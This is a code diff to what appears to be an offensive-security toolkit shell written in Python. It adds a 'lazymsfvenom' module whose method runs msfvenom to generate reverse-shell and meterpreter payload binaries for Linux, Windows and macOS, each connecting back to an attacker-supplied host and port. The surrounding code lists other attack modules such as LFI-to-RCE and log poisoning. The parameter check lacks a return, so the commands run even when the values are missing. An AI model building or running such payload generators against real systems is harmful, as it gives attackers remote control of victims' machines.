@@ -123,7 +123,8 @@ class LazyOwnShell(Cmd):
             "lazyhoneypot",
             "lazysearch_bot",
             "lazylfi2rce",
-            "lazylogpoisoning"
+            "lazylogpoisoning",
+            "lazymsfvenom"
         ]
         self.output = ""
 
@@ -354,7 +355,15 @@ class LazyOwnShell(Cmd):
             print("[?] mode, target_ip, and attacker_ip must be set")
             return
         os.system(f"{path}/modules/lazyatack.sh --modo {mode} --ip {target_ip} --atacante {attacker_ip}")
-
+    def run_lazymsfvenom(self):
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        path = os.getcwd()
+        if not lhost or not lport:
+            print("[?] lport and lhost mus be set")
+        os.system(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"{lhost}\" LPORT={lport} -f elf > shell.elf")
+        os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"{lhost}\" LPORT={lport} -f exe > shell.exe")
+        os.system(f"msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"{lhost}\" LPORT={lport} -f macho > shell.macho")
     def run_script(self, script_name, *args):
         """ Run a script with the given arguments """
         command = ["python3", script_name] + [str(arg) for arg in args]
